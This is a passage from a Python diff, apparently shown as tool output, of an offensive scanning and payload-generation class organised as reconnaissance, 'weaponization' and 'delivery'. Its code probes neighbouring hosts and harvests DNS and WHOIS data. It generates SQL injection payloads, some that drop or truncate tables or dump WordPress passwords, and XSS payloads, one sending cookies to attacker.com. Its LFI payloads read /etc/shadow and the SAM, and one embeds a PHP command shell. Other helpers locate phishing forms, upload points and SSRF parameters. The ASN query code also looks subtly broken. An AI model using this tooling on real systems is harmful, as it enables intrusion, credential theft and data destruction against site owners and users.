+  1596→    # -----------------------------------------------------------------------
+  1597→
+  1598→    def _enumerate_subnet(self, ip: str) -> List[Dict[str, Any]]:
+  1599→        """Probe adjacent IPs in the same /24 subnet."""
+  1600→        findings: List[Dict[str, Any]] = []
+  1601→        try:
+  1602→            parts = ip.split(".")
+  1603→            base = ".".join(parts[:3])
+  1604→            target_octet = int(parts[3])
+  1605→            probe_offsets = [-2, -1, 1, 2]
+  1606→            for offset in probe_offsets:
+  1607→                probe_ip = f"{base}.{target_octet + offset}"
+  1608→                if not (0 <= (target_octet + offset) <= 255):
+  1609→                    continue
+  1610→                try:
+  1611→                    socket.setdefaulttimeout(float(self.timeout))
+  1612→                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  1613→                    result = sock.connect_ex((probe_ip, 80))
+  1614→                    sock.close()
+  1615→                    if result == 0:
+  1616→                        rdns = _reverse_dns(probe_ip)
+  1617→                        findings.append(_make_finding(
+  1618→                            title="Active Host in Subnet",
+  1619→                            description=f"Host {probe_ip}:80 is active" + (f" (rdns: {rdns})" if rdns else ""),
+  1620→                            risk_score=3.5,
+  1621→                            technique="T1595 — Active Scanning",
+  1622→                            data={"ip": probe_ip, "port": 80, "rdns": rdns},
+  1623→                        ))
+  1624→                except (socket.error, OSError):
+  1625→                    pass
+  1626→        except (ValueError, IndexError):
+  1627→            pass
+  1628→        return findings
+  1629→
+  1630→    def _harvest_dns_records(self) -> List[Dict[str, str]]:
+  1631→        """Harvest DNS records via the system 'dig' command."""
+  1632→        records: List[Dict[str, str]] = []
+  1633→        record_types = ["A", "AAAA", "MX", "TXT", "NS", "SOA", "CNAME", "SRV"]
+  1634→        for rtype in record_types:
+  1635→            output = _run_subprocess(["dig", "+short", self._domain, rtype], timeout=self.timeout)
+  1636→            for line in output.strip().splitlines():
+  1637→                line = line.strip()
+  1638→                if line and not line.startswith(";") and not line.startswith(";;"):
+  1639→                    records.append({"type": rtype, "value": line, "domain": self._domain})
+  1640→        return records
+  1641→
+  1642→    def _whois_lookup(self) -> Dict[str, str]:
+  1643→        """Perform a WHOIS lookup via subprocess."""
+  1644→        output = _run_subprocess(["whois", self._domain], timeout=self.timeout)
+  1645→        if not output:
+  1646→            return {}
+  1647→        data: Dict[str, str] = {}
+  1648→        patterns = [
+  1649→            (r"Registrar:\s*(.+)", "registrar"),
+  1650→            (r"Creation Date:\s*(.+)", "creation_date"),
+  1651→            (r"Expiry Date:\s*(.+)", "expiry_date"),
+  1652→            (r"Name Server:\s*(.+)", "name_server"),
+  1653→            (r"Registrant Organization:\s*(.+)", "org"),
+  1654→            (r"Registrant Email:\s*(.+)", "email"),
+  1655→            (r"Updated Date:\s*(.+)", "updated_date"),
+  1656→            (r"Domain Status:\s*(.+)", "status"),
+  1657→        ]
+  1658→        for pattern, key in patterns:
+  1659→            match = re.search(pattern, output, re.IGNORECASE)
+  1660→            if match:
+  1661→                data[key] = match.group(1).strip()
+  1662→        return data
+  1663→
+  1664→    def _extract_subdomains_from_page(self) -> List[str]:
+  1665→        """Extract subdomains and related domains from page content."""
+  1666→        subdomains: set = set()
+  1667→        domain_suffix = "." + self._domain
+  1668→        # Extract from links
+  1669→        link_pattern = re.compile(r"https?://([a-z0-9.-]+" + re.escape(self._domain) + r")[^\s\"'<>]*", re.IGNORECASE)
+  1670→        for match in link_pattern.finditer(self._body_text):
+  1671→            full = match.group(1).lower()
+  1672→            if full != self._domain:
+  1673→                subdomains.add(full.split("/")[0])
+  1674→        # Extract from JS content references
+  1675→        js_pattern = re.compile(r"([a-z0-9-]+\." + re.escape(self._domain.replace(".", r"\.")) + r")", re.IGNORECASE)
+  1676→        for match in js_pattern.finditer(self._body_text):
+  1677→            sub = match.group(1).lower()
+  1678→            if sub.startswith("www."):
+  1679→                sub = sub[4:]
+  1680→            if sub != self._domain:
+  1681→                subdomains.add(sub)
+  1682→        # Extract from wildcard cert patterns in headers
+  1683→        for hdr_val in self._headers.values():
+  1684→            for pat in SUBDOMAIN_PATTERNS:
+  1685→                for m in pat.finditer(hdr_val):
+  1686→                    subdomains.add(m.group(0))
+  1687→        return sorted(d for d in subdomains if d != self._domain)
+  1688→
+  1689→    def _asn_lookup(self) -> Dict[str, str]:
+  1690→        """Attempt ASN lookup via dig TXT or subprocess."""
+  1691→        result: Dict[str, str] = {}
+  1692→        # Try dig for ASN origin
+  1693→        if self._ips:
+  1694→            ip = self._ips[0]
+  1695→            output = _run_subprocess(
+  1696→                ["dig", "+short", "-x", ip],
+  1697→                timeout=self.timeout,
+  1698→            )
+  1699→            if output.strip():
+  1700→                result["reverse"] = output.strip().splitlines()[0]
+  1701→            # Try BGP/ASN query
+  1702→            output2 = _run_subprocess(
+  1703→                ["dig", "+short", "AS{}.asn.cymru.com".format("0".join(ip.split("."))) + ".txt", "TXT"],
+  1704→                timeout=self.timeout,
+  1705→            )
+  1706→            for line in output2.strip().splitlines():
+  1707→                parts = line.strip().strip('"').split(" | ")
+  1708→                if len(parts) >= 5:
+  1709→                    result["asn"] = parts[0]
+  1710→                    result["org"] = parts[4]
+  1711→        return result
+  1712→
+  1713→    def _detect_technologies(self) -> List[str]:
+  1714→        """Detect technology stack from HTTP headers and page content."""
+  1715→        detected: List[str] = []
+  1716→        headers_str = "\n".join(f"{k}: {v}" for k, v in self._headers.items())
+  1717→
+  1718→        for tech_name, tech_info in TECH_SIGNATURES.items():
+  1719→            for sig in tech_info.get("headers", []):
+  1720→                if sig.lower() in headers_str.lower():
+  1721→                    if tech_name not in detected:
+  1722→                        detected.append(tech_name)
+  1723→                    break
+  1724→            for pattern in tech_info.get("cve_patterns", []):
+  1725→                if re.search(pattern, headers_str + "\n" + self._body_text, re.IGNORECASE):
+  1726→                    if tech_name not in detected:
+  1727→                        detected.append(tech_name)
+  1728→                    break
+  1729→
+  1730→        # Additional heuristics
+  1731→        if re.search(r"jquery|react|angular|vue\.js", self._body_text, re.IGNORECASE):
+  1732→            if "javascript_frameworks" not in detected:
+  1733→                detected.append("javascript_frameworks")
+  1734→        if re.search(r"cloudflare|cf-ray|x-cf-", headers_str, re.IGNORECASE):
+  1735→            detected.append("cloudflare")
+  1736→        if re.search(r"x-amz|s3|cloudfront", headers_str, re.IGNORECASE):
+  1737→            detected.append("aws")
+  1738→        if re.search(r"google-cloud|gcp|firebase", headers_str + self._body_text, re.IGNORECASE):
+  1739→            detected.append("gcp")
+  1740→
+  1741→        return detected
+  1742→
+  1743→    # -----------------------------------------------------------------------
+  1744→    # Helper methods — Weaponization
+  1745→    # -----------------------------------------------------------------------
+  1746→
+  1747→    def _generate_sqli_payloads(self) -> List[str]:
+  1748→        """Generate SQL injection payloads tailored to the target."""
+  1749→        payloads: List[str] = []
+  1750→        detected = self._detect_technologies()
+  1751→
+  1752→        # Generic payloads
+  1753→        generic = [
+  1754→            "' OR '1'='1",
+  1755→            "' OR 1=1--",
+  1756→            "admin'--",
+  1757→            "' UNION SELECT NULL--",
+  1758→            "1; DROP TABLE users--",
+  1759→            "' AND 1=1--",
+  1760→            "' AND 1=2--",
+  1761→            "1' ORDER BY 1--",
+  1762→            "' UNION ALL SELECT NULL,NULL,NULL--",
+  1763→            "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
+  1764→        ]
+  1765→        payloads.extend(generic)
+  1766→
+  1767→        # Tech-specific
+  1768→        if "wordpress" in detected or "php" in detected:
+  1769→            payloads.extend([
+  1770→                "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+  1771→                "1' UNION SELECT user(),password FROM wp_users--",
+  1772→            ])
+  1773→        if "aspnet" in detected or "iis" in detected:
+  1774→            payloads.extend([
+  1775→                "1'; EXEC sp_msforeachtable 'TRUNCATE TABLE ?'--",
+  1776→                "1' UNION SELECT name,null,null FROM sysobjects WHERE xtype='U'--",
+  1777→            ])
+  1778→
+  1779→        return payloads
+  1780→
+  1781→    def _generate_xss_payloads(self) -> List[str]:
+  1782→        """Generate XSS payloads for the target context."""
+  1783→        payloads: List[str] = [
+  1784→            "<script>alert('XSS')</script>",
+  1785→            '"><img src=x onerror=alert(1)>',
+  1786→            "'-alert(1)-'",
+  1787→            "<svg onload=alert(1)>",
+  1788→            "<iframe src=\"javascript:alert(1)\">",
+  1789→            "<body onload=alert(1)>",
+  1790→            "javascript:alert(1)",
+  1791→            "<img src=# onerror=\"alert('XSS')\">",
+  1792→            "<div style=\"background:url('javascript:alert(1)')\">",
+  1793→            "{{7*7}}",
+  1794→            "${7*7}",
+  1795→            "<%=7*7%>",
+  1796→            "<script>fetch('https://attacker.com/?c='+document.cookie)</script>",
+  1797→            "<input onfocus=alert(1) autofocus>",
+  1798→            "<marquee onstart=alert(1)>",
+  1799→            "<details open ontoggle=alert(1)>",
+  1800→        ]
+  1801→
+  1802→        # Check if the page contains forms — add form-context payloads
+  1803→        if re.search(r"<form|<input", self._body_text, re.IGNORECASE):
+  1804→            payloads.extend([
+  1805→                '"><input type="text" onfocus="alert(1)" autofocus>',
+  1806→                '" autofocus onfocus="alert(1)',
+  1807→            ])
+  1808→
+  1809→        return payloads
+  1810→
+  1811→    def _generate_lfi_payloads(self) -> List[str]:
+  1812→        """Generate Local File Inclusion payloads."""
+  1813→        payloads: List[str] = [
+  1814→            "../../../../etc/passwd",
+  1815→            "..\\..\\..\\..\\windows\\system32\\config\\sam",
+  1816→            "/etc/passwd",
+  1817→            "/etc/shadow",
+  1818→            "....//....//....//etc/passwd",
+  1819→            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+  1820→            "..%252f..%252f..%252fetc/passwd",
+  1821→            "/proc/self/environ",
+  1822→            "/proc/self/fd/0",
+  1823→            "/var/log/apache2/access.log",
+  1824→            "/var/log/auth.log",
+  1825→            "php://filter/convert.base64-encode/resource=index",
+  1826→            "expect://id",
+  1827→            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+  1828→        ]
+  1829→        return payloads
+  1830→
+  1831→    # -----------------------------------------------------------------------
+  1832→    # Helper methods — Delivery
+  1833→    # -----------------------------------------------------------------------
+  1834→
+  1835→    def _check_mx_records(self) -> List[str]:
+  1836→        """Check MX records via dig."""
+  1837→        output = _run_subprocess(["dig", "+short", "MX", self._domain], timeout=self.timeout)
+  1838→        return [line.strip() for line in output.strip().splitlines() if line.strip() and not line.startswith(";")]
+  1839→
+  1840→    def _check_spf(self) -> str:
+  1841→        """Check SPF record via dig TXT."""
+  1842→        output = _run_subprocess(["dig", "+short", "TXT", self._domain], timeout=self.timeout)
+  1843→        for line in output.strip().splitlines():
+  1844→            if "v=spf1" in line.lower():
+  1845→                return line.strip().strip('"')
+  1846→        return ""
+  1847→
+  1848→    def _check_dmarc(self) -> str:
+  1849→        """Check DMARC record via dig TXT on _dmarc subdomain."""
+  1850→        output = _run_subprocess(
+  1851→            ["dig", "+short", "TXT", f"_dmarc.{self._domain}"],
+  1852→            timeout=self.timeout,
+  1853→        )
+  1854→        for line in output.strip().splitlines():
+  1855→            if "v=dmarc1" in line.lower():
+  1856→                return line.strip().strip('"')
+  1857→        return ""
+  1858→
+  1859→    def _find_upload_endpoints(self) -> List[Dict[str, str]]:
+  1860→        """Find potential file upload endpoints in page content."""
+  1861→        endpoints: List[Dict[str, str]] = []
+  1862→        # Form-based uploads
+  1863→        upload_form_pattern = re.compile(
+  1864→            r'<form[^>]*[^>]*action=["\']([^"\']*)["\'][^>]*>.*?'
+  1865→            r'<input[^>]*type=["\']file["\'][^>]*>',
+  1866→            re.DOTALL | re.IGNORECASE,
+  1867→        )
+  1868→        for m in upload_form_pattern.finditer(self._body_text):
+  1869→            action = m.group(1)
+  1870→            if not action.startswith(("http://", "https://")):
+  1871→                action = self._base_url + action
+  1872→            endpoints.append({"action": action, "method": "POST", "type": "form"})
+  1873→
+  1874→        # API-style endpoints in JS
+  1875→        api_pattern = re.compile(r'["\'](?:upload|file|attachment|media)["\'].*?["\']([^"\']*(?:/upload|/file|/media|/attach)[^"\']*)["\']', re.IGNORECASE)
+  1876→        for m in api_pattern.finditer(self._body_text):
+  1877→            endpoints.append({"action": m.group(1), "method": "POST", "type": "api"})
+  1878→
+  1879→        return endpoints
+  1880→
+  1881→    def _check_upload_restrictions(self) -> Dict[str, Any]:
+  1882→        """Analyse upload restrictions from headers and page content."""
+  1883→        result: Dict[str, Any] = {"risk": 3.0, "indicators": []}
+  1884→
+  1885→        # Check Content-Type restrictions in headers
+  1886→        accept_header = self._headers.get("accept", "")
+  1887→        if "*" in accept_header or not accept_header:
+  1888→            result["indicators"].append("No Content-Type restriction in Accept header")
+  1889→
+  1890→        # Check for client-side validation patterns
+  1891→        allowed_ext_pattern = re.compile(
+  1892→            r"accept=[\"']([^\"]+)[\"']",
+  1893→            re.IGNORECASE,
+  1894→        )
+  1895→        for m in allowed_ext_pattern.finditer(self._body_text):
+  1896→            result["indicators"].append(f"Allowed extensions: {m.group(1)}")
+  1897→
+  1898→        # Check for size restrictions
+  1899→        size_pattern = re.compile(
+  1900→            r"(?:max_file_size|maxSize|MAX_FILE_SIZE|maxFileSize)[^\d]*(\d+)",
+  1901→            re.IGNORECASE,
+  1902→        )
+  1903→        for m in size_pattern.finditer(self._body_text):
+  1904→            result["indicators"].append(f"Upload size limit: {m.group(1)} bytes")
+  1905→
+  1906→        # Check CORS headers
+  1907→        cors = self._headers.get("access-control-allow-origin", "")
+  1908→        if cors == "*":
+  1909→            result["indicators"].append("Permissive CORS (wildcard origin)")
+  1910→            result["risk"] = max(result["risk"], 5.0)
+  1911→
+  1912→        if len(result["indicators"]) > 3:
+  1913→            result["risk"] = min(result["risk"] + 2.0, 10.0)
+  1914→
+  1915→        return result
+  1916→
+  1917→    def _detect_phishing_vectors(self) -> List[Dict[str, str]]:
+  1918→        """Detect forms usable for phishing (login, signup, newsletter, contact)."""
+  1919→        vectors: List[Dict[str, str]] = []
+  1920→        form_types = [
+  1921→            ("login", r"(?:login|sign[-_]?in|log[-_]?in)", r"password"),
+  1922→            ("signup", r"(?:sign[-_]?up|register|join|create[-_]?account)", None),
+  1923→            ("newsletter", r"(?:newsletter|subscribe|mailing[-_]?list)", r"email"),
+  1924→            ("contact", r"(?:contact|feedback|support|help)", None),
+  1925→            ("search", r"(?:search|query|find)", r"(?:q|query|search|keyword)"),
+  1926→        ]
+  1927→        form_pattern = re.compile(
+  1928→            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>',
+  1929→            re.DOTALL | re.IGNORECASE,
+  1930→        )
+  1931→        for form_match in form_pattern.finditer(self._body_text):
+  1932→            action = form_match.group(1)
+  1933→            body = form_match.group(2)
+  1934→            for ftype, action_re, field_re in form_types:
+  1935→                if re.search(action_re, action + " " + body, re.IGNORECASE):
+  1936→                    fields = re.findall(r'<input[^>]*name=["\']([^"\']*)["\']', body, re.IGNORECASE)
+  1937→                    if field_re:
+  1938→                        has_field = any(re.search(field_re, f, re.IGNORECASE) for f in fields)
+  1939→                        if not has_field:
+  1940→                            continue
+  1941→                    vectors.append({"type": ftype, "action": action, "fields": fields[:5]})
+  1942→
+  1943→        return vectors
+  1944→
+  1945→    def _detect_ssrf_endpoints(self) -> List[Dict[str, str]]:
+  1946→        """Detect endpoints potentially vulnerable to SSRF."""
+  1947→        endpoints: List[Dict[str, str]] = []
+  1948→        ssrf_indicators = [
+  1949→            r"url=(?:http|https|ftp)://",
+  1950→            r"redirect=(?:http|https)://",
+  1951→            r"return(?:Url|_url|to)=(?:http|https)://",
+  1952→            r"next=(?:http|https)://",
+  1953→            r"callback=(?:http|https)://",
+  1954→            r"reference=(?:http|https)://",
+  1955→            r"dest=(?:http|https)://",
+  1956→            r"fetch(?:Url|_url|URL)=",
+  1957→            r"link=(?:http|https)://",
+  1958→            r"goto=(?:http|https)://",
+  1959→            r"out=(?:http|https)://",
+  1960→            r"img=(?:http|https)://",
+  1961→            r"src=(?:http|https)://",
+  1962→            r"proxy=(?:http|https)://",
+  1963→        ]
+  1964→        for pattern in ssrf_indicators:
+  1965→            for match in re.finditer(pattern, self._body_text, re.IGNORECASE):
+  1966→                param_name = match.group(0).split("=")[0]
+  1967→                endpoints.append({"parameter": param_name, "pattern": match.group(0)[:100]})
+  1968→
+  1969→        # Also check for fetch/XMLHttpRequest patterns that take URLs
+  1970→        fetch_pattern = re.compile(
+  1971→            r'(?:fetch|XMLHttpRequest|\.ajax|axios)\s*\(\s*["\'](?:https?://[^"\']+)["\']',
+  1972→            re.IGNORECASE,
+  1973→        )
+  1974→        for match in fetch_pattern.finditer(self._body_text):
+  1975→            endpoints.append({"parameter": "fetch_url", "pattern": match.group(0)[:100]})
+  1976→
+  1977→        return endpoints
+  1978→
+  1979→    def _check_open_relay(self) -> Dict[str, Any]:
+  1980→        """Assess open relay potential via MX analysis."""
+  1981→        result: Dict[str, Any] = {"description": "", "risk_score": 2.0}
+  1982→        mx_records = self._check_mx_records()
+  1983→        if not mx_records:
+  1984→            result["description"] = "No MX records found"
+  1985→            return result
+  1986→
+  1987→        # Check for common open-relay indicators
+  1988→        common_providers = ["google", "gmail", "outlook", "microsoft", "yahoo", "amazon", "protection", "mimecast", "proofpoint"]
+  1989→        for mx in mx_records:
+  1990→            mx_lower = mx.lower()
+  1991→            is_managed = any(p in mx_lower for p in common_providers)
+  1992→            if not is_managed:
+  1993→                result["risk_score"] = 5.0
+  1994→                result["description"] = f"Potential self-hosted mail: {mx}"
+  1995→                result["self_hosted"] = True
+  1996→            else:
+  1997→                result["description"] = f"Mail handled by: {mx}"
+  1998→
+  1999→        return result
+  2000→
+
+[showing lines 1-2000 of 2993; use offset=2001 with limit to continue reading]
